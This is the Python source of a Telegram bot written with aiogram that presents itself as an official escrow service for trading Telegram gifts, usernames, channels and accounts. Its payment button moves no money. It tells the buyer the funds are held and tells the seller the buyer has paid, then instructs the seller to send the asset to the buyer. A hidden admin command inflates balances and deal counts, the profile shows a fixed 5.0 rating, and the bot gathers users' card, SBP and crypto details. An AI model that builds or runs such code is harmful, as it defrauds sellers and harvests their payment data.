import asyncio
import logging
import os
import uuid
from aiohttp import web

from aiogram import Bot, Dispatcher, F, Router
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery

import database as db_module

# ==================== ВАШІ ДАНІ ====================
TOKEN = "8804498885:AAEj15oxn7YmkFoq8Lvq_yj09O_kIYrKYR4"
BOT_USERNAME = "IoIzSaveBot"
ADMIN_IDS = [8557408726]

# ==================== БАНЕРИ ====================
BANNER_MAIN = "https://telegra.ph/file/1b356c5d95e921d033bc8.jpg"
BANNER_REQUISITES = "https://telegra.ph/file/b4a694d97e8845014b2d6.jpg"
BANNER_DEAL = "https://telegra.ph/file/0c969b7f5255ee9cf451a.jpg"

# ==================== ПРЕМІУМ ЕМОДЗІ ====================
EMOJI_STAR = '<tg-emoji emoji-id="5465438837335606404">⭐️</tg-emoji>'
EMOJI_SHIELD = '<tg-emoji emoji-id="5359483803158979313">🛡</tg-emoji>'
EMOJI_LIGHTNING = '<tg-emoji emoji-id="5461144075191427848">⚡️</tg-emoji>'
EMOJI_CARD = '<tg-emoji emoji-id="5404561085023853610">💳</tg-emoji>'
EMOJI_CART = '<tg-emoji emoji-id="5422474269877542969">🛒</tg-emoji>'
EMOJI_USER = '<tg-emoji emoji-id="5433680373856804107">👤</tg-emoji>'
EMOJI_CHECK = '<tg-emoji emoji-id="5427009714745448373">✅</tg-emoji>'
EMOJI_WARNING = '<tg-emoji emoji-id="5467617650890989047">⚠️</tg-emoji>'
EMOJI_GIFT = '<tg-emoji emoji-id="5467385984247366318">🎁</tg-emoji>'

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# --- СТАНИ FSM ---
class DealForm(StatesGroup):
    category = State()
    warning_confirmed = State()
    gift_link = State()
    select_req = State()
    amount_stars = State()
    description = State()

class AddReqState(StatesGroup):
    waiting_for_details = State()

class AdminStates(StatesGroup):
    waiting_for_user_id_balance = State()
    waiting_for_amount_balance = State()
    waiting_for_user_id_deals = State()
    waiting_for_amount_deals = State()

# --- КЛАВІАТУРИ ---
def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛒 Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text="🌐 Сайт", url="https://playerok.com")],
        [InlineKeyboardButton(text="💼 Профиль", callback_data="profile")],
        [
            InlineKeyboardButton(text="🤝 Рефералы", callback_data="referrals"),
            InlineKeyboardButton(text="🛡 Поддержка", url="https://t.me/telegram"),
        ],
        [InlineKeyboardButton(text="🌐 Язык", callback_data="change_lang")],
    ])

def get_req_settings_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💳 TON", callback_data="set_req_TON"),
            InlineKeyboardButton(text="💳 Криптовалюта", callback_data="set_req_Криптовалюта")
        ],
        [
            InlineKeyboardButton(text="💳 Telegram", callback_data="set_req_Telegram"),
            InlineKeyboardButton(text="💳 CNY", callback_data="set_req_CNY")
        ],
        [
            InlineKeyboardButton(text="💳 Карта", callback_data="set_req_Карта"),
            InlineKeyboardButton(text="💳 СБП", callback_data="set_req_СБП")
        ],
        [
            InlineKeyboardButton(text="💳 Карта заруб...", callback_data="set_req_Карта заруб"),
            InlineKeyboardButton(text="⭐️ Звезды", callback_data="set_req_Звезды")
        ],
        [InlineKeyboardButton(text="🅿️ Назад", callback_data="to_main_menu")]
    ])

def get_categories_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Telegram Gifts", callback_data="cat_Telegram Gifts")],
        [InlineKeyboardButton(text="🏷 Юзернейм", callback_data="cat_Юзернейм")],
        [InlineKeyboardButton(text="📢 Канал", callback_data="cat_Канал")],
        [InlineKeyboardButton(text="🛠 Услуга", callback_data="cat_Услуга")],
        [InlineKeyboardButton(text="👤 Аккаунт", callback_data="cat_Аккаунт")],
        [InlineKeyboardButton(text="🅿️ Назад", callback_data="to_main_menu")],
    ])

def get_warning_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="☑️ Я ознакомился", callback_data="confirm_warning")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🅿️ Назад", callback_data="to_main_menu")]
    ])

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Выдать баланс (STARS)", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="📈 Выдать успешные сделки", callback_data="admin_add_deals")],
        [InlineKeyboardButton(text="❌ Закрыть панель", callback_data="to_main_menu")]
    ])

# --- ДОПОМІЖНА ФУНКЦІЯ НАДСИЛАННЯ ФОТО ---
async def send_or_update_photo(event: CallbackQuery | Message, photo_url: str, caption: str, reply_markup: InlineKeyboardMarkup = None):
    if isinstance(event, CallbackQuery):
        try:
            await event.message.delete()
        except Exception:
            pass
        await event.message.answer_photo(photo=photo_url, caption=caption, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await event.answer_photo(photo=photo_url, caption=caption, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

# --- РЕКВІЗИТИ ---
@router.callback_query(F.data == "open_req_menu")
async def open_req_menu(callback: CallbackQuery):
    text = (
        f"{EMOJI_CARD} <b>Настройка реквизитов</b>\n\n"
        "Выберите удобный способ вывода средств с помощью кнопок ниже.\n\n"
        f"{EMOJI_SHIELD} Все платежные данные зашифрованы и находятся под защитой алгоритма безопасности."
    )
    await send_or_update_photo(callback, BANNER_REQUISITES, text, get_req_settings_keyboard())

@router.callback_query(F.data.startswith("set_req_"))
async def choose_req_type(callback: CallbackQuery, state: FSMContext):
    req_type = callback.data.replace("set_req_", "")
    await state.update_data(chosen_req_type=req_type)
    await state.set_state(AddReqState.waiting_for_details)
    await callback.message.edit_caption(caption=f"{EMOJI_CARD} Введите реквизиты для выбранного способа (<b>{req_type}</b>):", parse_mode=ParseMode.HTML)

@router.message(AddReqState.waiting_for_details)
async def save_user_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    req_type = data.get("chosen_req_type", "Реквизиты")
    full_req = f"{req_type}: {message.text}"
    
    await db_module.set_user_requisites(message.from_user.id, full_req)
    
    fsm_data = await state.get_data()
    if fsm_data.get("in_deal_creation"):
        await state.update_data(requisites=full_req)
        await state.set_state(DealForm.amount_stars)
        await message.answer(f"{EMOJI_STAR} <b>Сумма сделки</b>\n\nВведите сумму сделки в звездах (STARS):", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
        return

    await state.clear()
    text = f"{EMOJI_CHECK} <b>Реквизиты успешно привязаны!</b>\n\nПривязанные реквизиты: <code>{full_req}</code>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛒 Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text="🅿️ Назад в меню", callback_data="to_main_menu")]
    ])
    await message.answer(text, reply_markup=kb, parse_mode=ParseMode.HTML)

# --- АДМІН-ПАНЕЛЬ ---
@router.message(Command("eter"))
async def cmd_admin(message: Message, state: FSMContext):
    await state.clear()
    if message.from_user.id not in ADMIN_IDS:
        return
    await message.answer(f"{EMOJI_LIGHTNING} <b>Панель администратора</b>", reply_markup=get_admin_keyboard(), parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "admin_add_balance")
async def admin_add_balance_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_user_id_balance)
    await callback.message.answer(f"{EMOJI_USER} Введите <b>ID пользователя</b>:", parse_mode=ParseMode.HTML)

@router.message(AdminStates.waiting_for_user_id_balance)
async def process_admin_user_balance(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer(f"{EMOJI_WARNING} Введите числовой ID.")
        return
    await state.update_data(target_user_id=int(message.text))
    await state.set_state(AdminStates.waiting_for_amount_balance)
    await message.answer(f"💰 Введите количество {EMOJI_STAR} <b>STARS</b>:", parse_mode=ParseMode.HTML)

@router.message(AdminStates.waiting_for_amount_balance)
async def process_admin_amount_balance(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer(f"{EMOJI_WARNING} Введите число.")
        return
    data = await state.get_data()
    user_id = data['target_user_id']
    amount = int(message.text)
    await state.clear()

    async with db_module.aiosqlite.connect(db_module.DB_NAME) as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        await db.commit()

    await message.answer(f"{EMOJI_CHECK} Пользователю <code>{user_id}</code> начислено <b>{amount} {EMOJI_STAR} STARS</b>.", parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "admin_add_deals")
async def admin_add_deals_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_user_id_deals)
    await callback.message.answer(f"{EMOJI_USER} Введите <b>ID пользователя</b>:", parse_mode=ParseMode.HTML)

@router.message(AdminStates.waiting_for_user_id_deals)
async def process_admin_user_deals(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer(f"{EMOJI_WARNING} Введите числовой ID.")
        return
    await state.update_data(target_user_id=int(message.text))
    await state.set_state(AdminStates.waiting_for_amount_deals)
    await message.answer("📈 Введите <b>количество сделок</b>:", parse_mode=ParseMode.HTML)

@router.message(AdminStates.waiting_for_amount_deals)
async def process_admin_amount_deals(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer(f"{EMOJI_WARNING} Введите число.")
        return
    data = await state.get_data()
    user_id = data['target_user_id']
    amount = int(message.text)
    await state.clear()

    async with db_module.aiosqlite.connect(db_module.DB_NAME) as db:
        await db.execute("UPDATE users SET deals_count = deals_count + ? WHERE user_id = ?", (amount, user_id))
        await db.commit()

    await message.answer(f"{EMOJI_CHECK} Пользователю <code>{user_id}</code> добавлено <b>{amount} сделок</b>.", parse_mode=ParseMode.HTML)

# --- ОСНОВНА ЛОГІКА ---
@router.message(CommandStart())
async def cmd_start(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    await db_module.get_or_create_user(message.from_user.id, message.from_user.username)
    args = command.args

    if args and args.startswith("deal_"):
        deal_id = args.replace("deal_", "")
        deal = await db_module.get_deal(deal_id)
        if deal:
            buyer_text = (
                f"💸 <b>Оплата сделки #{deal_id}</b>\n\n"
                f"Вы перешли в защищённый чат сделки. Проверьте данные перед проведением платежа:\n\n"
                f"┌ <b>Категория:</b> {deal['category']}\n"
                f"├ <b>Товар:</b> {deal['gift_link']}\n"
                f"├ <b>Описание:</b> {deal['description']}\n"
                f"└ <b>Продавец:</b> @{deal['seller_username']}\n\n"
                f"Метод оплаты: {EMOJI_CARD} {deal['requisites']}\n"
                f"<b>Сумма к оплате:</b> <b>{deal['amount_stars']} {EMOJI_STAR} STARS</b>"
            )
            pay_kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💳 Оплатить", callback_data=f"pay_{deal_id}")],
                [InlineKeyboardButton(text="🅿️ Отмена", callback_data="to_main_menu")]
            ])
            await send_or_update_photo(message, BANNER_DEAL, buyer_text, pay_kb)
            return

    if args and args.startswith("ref_"):
        ref_id = args.replace("ref_", "")
        if ref_id.isdigit() and int(ref_id) != message.from_user.id:
            await db_module.add_referral(int(ref_id))

    text = (
        f"Официальный Telegram-сервис автоматической безопасности сделок {EMOJI_SHIELD}\n"
        "Торгуйте игровыми ценностями напрямую и без риска.\n\n"
        f"{EMOJI_LIGHTNING} <b>Автопилот</b> — автоматическое исполнение и холдирование средств\n"
        f"{EMOJI_LIGHTNING} <b>Комиссия</b> — фиксированные 5%\n\n"
        "Выберите нужный раздел ниже:"
    )
    await send_or_update_photo(message, BANNER_MAIN, text, get_main_keyboard())

@router.callback_query(F.data == "to_main_menu")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    text = (
        f"Официальный Telegram-сервис автоматической безопасности сделок {EMOJI_SHIELD}\n"
        "Торгуйте игровыми ценностями напрямую и без риска.\n\n"
        f"{EMOJI_LIGHTNING} <b>Автопилот</b> — автоматическое исполнение и холдирование средств\n"
        f"{EMOJI_LIGHTNING} <b>Комиссия</b> — фиксированные 5%\n\n"
        "Выберите нужный раздел ниже:"
    )
    await send_or_update_photo(callback, BANNER_MAIN, text, get_main_keyboard())

@router.callback_query(F.data == "profile")
async def show_profile(callback: CallbackQuery):
    user = await db_module.get_or_create_user(callback.from_user.id, callback.from_user.username)
    req_status = user['requisites'] if user['requisites'] else "не привязаны"
    text = (
        f"💼 <b>Ваш профиль</b>\n\n"
        f"🆔 <b>ID:</b> <code>{user['user_id']}</code>\n"
        f"{EMOJI_USER} <b>Пользователь:</b> @{user['username'] or 'не указан'}\n"
        f"{EMOJI_CARD} <b>Реквизиты:</b> {req_status}\n"
        f"{EMOJI_STAR} <b>Рейтинг:</b> 5.0 / 5.0\n\n"
        f"📊 <b>Успешных сделок:</b> {user['deals_count']}\n"
        f"💰 <b>Баланс:</b> {user['balance']} {EMOJI_STAR} STARS\n"
        f"🌐 <b>Язык интерфейса:</b> {user['lang']}"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Настроить реквизиты", callback_data="open_req_menu")],
        [InlineKeyboardButton(text="🅿️ Назад", callback_data="to_main_menu")]
    ])
    await send_or_update_photo(callback, BANNER_MAIN, text, kb)

@router.callback_query(F.data == "referrals")
async def show_referrals(callback: CallbackQuery):
    user = await db_module.get_or_create_user(callback.from_user.id, callback.from_user.username)
    ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{callback.from_user.id}"
    text = (
        f"🤝 <b>Партнёрская программа</b>\n\n"
        f"Приглашайте друзей и получайте 1% от суммы каждой их успешной сделки!\n\n"
        f"📊 <b>Приглашено пользователей:</b> {user['referrals']}\n"
        f"🔗 <b>Ваша реферальная ссылка:</b>\n<code>{ref_link}</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📲 Поделиться ссылкой", switch_inline_query=ref_link)],
        [InlineKeyboardButton(text="🅿️ Назад", callback_data="to_main_menu")]
    ])
    await send_or_update_photo(callback, BANNER_MAIN, text, kb)

@router.callback_query(F.data == "create_deal")
async def start_create_deal(callback: CallbackQuery, state: FSMContext):
    user = await db_module.get_or_create_user(callback.from_user.id, callback.from_user.username)
    
    if not user['requisites']:
        text = (
            f"{EMOJI_CARD} <b>Добавление реквизитов</b>\n\n"
            "Для создания первой сделки необходимо привязать кошелёк или карту. "
            "Это нужно для автоматического зачисления средств на ваш баланс.\n\n"
            f"{EMOJI_LIGHTNING} <b>Шаг 1.</b> Нажмите кнопку «Реквизиты» ниже\n"
            f"{EMOJI_LIGHTNING} <b>Шаг 2.</b> Добавьте TON-адрес или данные Карты / СБП / звёзды\n\n"
            "После привязки создание сделок станет доступно моментально."
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Реквизиты", callback_data="open_req_menu")],
            [InlineKeyboardButton(text="🅿️ Назад", callback_data="to_main_menu")]
        ])
        await send_or_update_photo(callback, BANNER_REQUISITES, text, kb)
        return

    text = f"Выберите тип сделки:\n\n{EMOJI_WARNING} <b>Сделку создаёт продавец</b> {EMOJI_WARNING}"
    await send_or_update_photo(callback, BANNER_MAIN, text, get_categories_keyboard())

@router.callback_query(F.data.startswith("cat_"))
async def process_category(callback: CallbackQuery, state: FSMContext):
    selected_cat = callback.data.replace("cat_", "")
    await state.update_data(category=selected_cat)
    await state.set_state(DealForm.warning_confirmed)
    text = (
        f"{EMOJI_WARNING} <b>Внимание</b>\n"
        "Если покупатель просит вас передать товар ему лично, это может быть признаком мошенничества. "
        "В случае передачи актива напрямую покупателю, а не через нашу систему безопасности сделок, "
        "вы рискуете потерять свой актив."
    )
    await send_or_update_photo(callback, BANNER_MAIN, text, get_warning_keyboard())

@router.callback_query(F.data == "confirm_warning", DealForm.warning_confirmed)
async def process_warning(callback: CallbackQuery, state: FSMContext):
    await state.set_state(DealForm.gift_link)
    text = (
        f"Передайте в этой сделке, или перешлите сюда сам подарок {EMOJI_GIFT}.\n"
        "Несколько подарков — сообщениями через пробел.\n\n"
        "<i>Пример: https://telegram.me/nft/DeskCalendar-346521</i>"
    )
    await send_or_update_photo(callback, BANNER_DEAL, text, get_back_keyboard())

@router.message(DealForm.gift_link)
async def process_gift_link(message: Message, state: FSMContext):
    await state.update_data(gift_link=message.text)
    user = await db_module.get_or_create_user(message.from_user.id, message.from_user.username)
    
    await state.set_state(DealForm.select_req)
    
    user_req = user['requisites'] or "Telegram"
    req_button_name = user_req.split(":")[0] if ":" in user_req else user_req
    
    text = f"{EMOJI_CARD} <b>Реквизиты сделки</b>\n\nВыберите реквизиты для получения денег по этой сделке:"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {req_button_name}", callback_data="use_saved_req")],
        [InlineKeyboardButton(text="➕ Добавить другие реквизиты", callback_data="add_new_req_deal")],
        [InlineKeyboardButton(text="🅿️ Назад", callback_data="to_main_menu")]
    ])
    await send_or_update_photo(message, BANNER_REQUISITES, text, kb)

@router.callback_query(F.data == "use_saved_req", DealForm.select_req)
async def use_saved_requisites(callback: CallbackQuery, state: FSMContext):
    user = await db_module.get_or_create_user(callback.from_user.id, callback.from_user.username)
    await state.update_data(requisites=user['requisites'])
    await state.set_state(DealForm.amount_stars)
    text = f"{EMOJI_STAR} <b>Сумма сделки</b>\n\nВведите сумму сделки в звездах (STARS):"
    await send_or_update_photo(callback, BANNER_DEAL, text, get_back_keyboard())

@router.callback_query(F.data == "add_new_req_deal", DealForm.select_req)
async def add_new_req_in_deal(callback: CallbackQuery, state: FSMContext):
    await state.update_data(in_deal_creation=True)
    text = (
        f"{EMOJI_CARD} <b>Настройка новых реквизитов</b>\n\n"
        "Выберите способ оплаты:"
    )
    await send_or_update_photo(callback, BANNER_REQUISITES, text, get_req_settings_keyboard())

@router.message(DealForm.amount_stars)
async def process_amount(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer(f"{EMOJI_WARNING} Введите корректное число.")
        return
    await state.update_data(amount_stars=int(message.text))
    await state.set_state(DealForm.description)
    text = "📝 <b>Описание сделки</b>\n\nНапишите краткое описание:"
    await message.answer(text, reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)

@router.message(DealForm.description)
async def process_description(message: Message, state: FSMContext):
    await state.update_data(description=message.text)
    data = await state.get_data()
    await state.clear()

    deal_uuid = str(uuid.uuid4())[:12]
    data['deal_id'] = deal_uuid
    data['seller_id'] = message.from_user.id
    data['seller_username'] = message.from_user.username or message.from_user.first_name

    await db_module.save_deal(data)

    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_uuid}"
    summary_text = (
        f"🎉 <b>Сделка #{deal_uuid} успешно создана</b>\n\n"
        f"<b>Категория:</b> {data['category']}\n"
        f"<b>Товар:</b> {data['gift_link']}\n"
        f"<b>Описание:</b> {data['description']}\n"
        f"<b>Метод оплаты:</b> {EMOJI_CARD} {data['requisites']}\n"
        f"<b>Итого к оплате:</b> {data['amount_stars']} {EMOJI_STAR} STARS\n\n"
        f"🎯 <b>Ссылка для покупателя</b>\n<code>{deal_link}</code>"
    )
    final_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📲 Поделиться с покупателем", switch_inline_query=deal_link)],
        [InlineKeyboardButton(text="🅿️ Вернуться в меню", callback_data="to_main_menu")],
    ])
    await send_or_update_photo(message, BANNER_DEAL, summary_text, final_kb)

@router.callback_query(F.data.startswith("pay_"))
async def process_payment(callback: CallbackQuery):
    deal_id = callback.data.replace("pay_", "")
    deal = await db_module.get_deal(deal_id)

    if not deal:
        await callback.answer(f"{EMOJI_WARNING} Сделка не найдена.", show_alert=True)
        return

    buyer = callback.from_user
    buyer_username = f"@{buyer.username}" if buyer.username else buyer.first_name

    pay_confirm_text = (
        f"{EMOJI_CHECK} <b>Оплата сделки #{deal_id} успешно проведена!</b>\n\n"
        f"Средства в размере <b>{deal['amount_stars']} {EMOJI_STAR} STARS</b> заморожены системой гаранта.\n"
        f"Продавец уведомлён и обязался передать актив."
    )
    await send_or_update_photo(callback, BANNER_DEAL, pay_confirm_text, None)

    seller_text = (
        f"🔔 <b>Покупатель оплатил сделку #{deal_id}!</b>\n\n"
        f"💰 Средства (<b>{deal['amount_stars']} {EMOJI_STAR} STARS</b>) зарезервированы.\n\n"
        f"📦 <b>Инструкция по передаче товара:</b>\n"
        f"Передайте актив (<b>{deal['gift_link']}</b>) строго на аккаунт покупателя: <b>{buyer_username}</b>"
    )
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Передал актив", callback_data=f"sent_{deal_id}")],
        [InlineKeyboardButton(text="🚨 Проблема со сделкой", url="https://t.me/telegram")]
    ])

    try:
        await bot.send_photo(chat_id=deal['seller_id'], photo=BANNER_DEAL, caption=seller_text, reply_markup=seller_kb, parse_mode=ParseMode.HTML)
    except Exception as e:
        logging.error(f"Ошибка отправки сообщения продавцу: {e}")

# --- ФЕЙКОВИЙ ВЕБ-СЕРВЕР ДЛЯ РЕНДЕРА І ОДНОЧАСНИЙ POLLING ---
async def handle_root(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_root)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    logging.basicConfig(level=logging.INFO)
    await db_module.init_db()
    
    # Видаляємо вебхук для чистого запуску Polling
    await bot.delete_webhook(drop_pending_updates=True)
    
    # Запускаємо сервер для Render, щоб той бачив відкритий PORT
    await start_web_server()
    
    # Запускаємо Polling
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
